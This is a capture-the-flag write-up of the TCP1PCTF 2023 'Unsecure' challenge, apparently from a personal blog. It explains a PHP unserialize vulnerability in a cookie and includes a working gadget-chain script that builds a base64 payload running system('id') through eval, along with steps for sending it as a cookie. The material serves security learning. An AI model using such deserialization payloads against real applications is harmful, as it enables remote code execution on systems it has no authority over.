+++
title = "[TCP1PCTF 2023] Unsecure"
description = "TCP1PCTF was organized by Indonesian and it was opened to anyone. The challenge is solely focus on exploiting deserialization vulnerability and how to chain the gadget to get code execution."
date = 2023-10-17T22:31:44+08:00
draft = false
tags = [ "ctf", "deserialization" ]
+++

For this challenge, we were provided with source code (dockerize). You also can download it [here][dockerimage].

## Overview

> 🚧 **Description** : Do you know what "unserialize" means? In PHP, unserialize is something that can be very dangerous, you know? It can cause Remote Code Execution. And if it's combined with an autoloader like in Composer, it can use gadgets in the autoloaded folder to achieve Remote Code Execution.

Based on the source code, the challenge is pretty straight forward. On index.php file, it took user input from cookie and passed it to `unserialize()` function. 

```php
// index.php
<?php
require("vendor/autoload.php");

if (isset($_COOKIE['cookie'])) {
    $cookie = base64_decode($_COOKIE['cookie']);
    unserialize($cookie);
}

echo "Welcome to my web app!";
```

Since the application blindly passed user input to `unserilize()` function, this will lead to deserialize vulnerability. Once we identify the source, now lets find the sink for gadget chain. Based on file provided, there were three additional files which are `GadgetOne/Adders.php`, `GadgetTwo/Echoers.php` and `GadgetThree/Vuln.php`. Based on the file name, ***maybe*** `GadgetThree/Vuln.php` is the sink.

```php
// GadgetOne/Adders.php
<?php

namespace GadgetOne {
    class Adders
    {
        private $x;
        function __construct($x)
        {
            $this->x = $x;
        }
        function get_x()
        {
            return $this->x;
        }
    }
}
```
```php
// GadgetTwo/Echoers.php
<?php

namespace GadgetTwo {
    class Echoers
    {
        protected $klass;
        function __destruct()
        {
            echo $this->klass->get_x();
        }
    }
}
```
```php
// GadgetThree/Vuln.php
<?php

namespace GadgetThree {
    class Vuln
    {
        public $waf1;
        protected $waf2;
        private $waf3;
        public $cmd;
        function __toString()
        {
            if (!($this->waf1 === 1)) {
                die("not x");
            }
            if (!($this->waf2 === "\xde\xad\xbe\xef")) {
                die("not y");
            }
            if (!($this->waf3) === false) {
                die("not z");
            }
            eval($this->cmd);
        }
    }
}
```

On `GadgetThree/Vuln.php`, it has a magic method so called `__toString()` and after several if statement, it call `eval()` function. Unlike `__wakeup()` and `__construct()`, which always get executed if the object is created, the `__toString()` method is invoked only when the object is treated as a string. For example, it can decide what to display if the object is passed into an `echo()` or `print()` function. On `GadgetTwo/Echoers`, the class will echo *class* when it destructed. The class must have `get_x()` function from the object, and `get_x()` is exist on `GadgetOne/Adders.php`. Before that, we need to set property of `$klass` is accessable because it was private variable. This can be done using `ReflectionClass`.

Once get the grasp the idea, here is the flow:
- Create `GadgetThree\Vuln` object
- Create `GadgetOne\Adders` object and pass `GadgetThree\Vuln` object as a parameter
- Create `GadgetTwo\Echoers` and set `$klass` property to be acessible
- Set `$klass` to `GadgetOne\Adders`.

## Solution

```php
<?php

namespace GadgetOne {
    class Adders {
        private $x;
        function __construct($x) {
            $this->x = $x;
        } 
    }
}

namespace GadgetTwo {
    class Echoers {
        protected $klass;
    }
}

namespace GadgetThree {
    class Vuln {
        public $waf1 = 1;
        protected $waf2 = "\xde\xad\xbe\xef";
        private $waf3 = false;
        public $cmd = "system('id');";
    }
}

namespace {
    $GadgetThree = new GadgetThree\Vuln();
    $GadgetOne = new GadgetOne\Adders($GadgetThree);
    $GadgetTwo = new GadgetTwo\Echoers();
    $reflectionClass = new ReflectionClass($GadgetTwo);
    $reflectionProperty = $reflectionClass->getProperty("klass");
    $reflectionProperty->setAccessible(true);
    $reflectionProperty->setValue($GadgetTwo, $GadgetOne);

    $serialized = base64_encode(serialize($GadgetTwo));
    echo $serialized."\n";    
}
```

After generating the encoded payload, create cookie named `cookie` using devtools(or any plugin) and set it to our encoded value. You will see the command will be executed after the page refreshed.

{{< figure src="/img/posts/ctf_2023_tcp1pctf_unsecure/1.png" caption="Figure 1: Code execution via deserialize" width="100%" align="center" >}}

[dockerimage]:/img/posts/ctf_2023_tcp1pctf_unsecure/unSecure.zip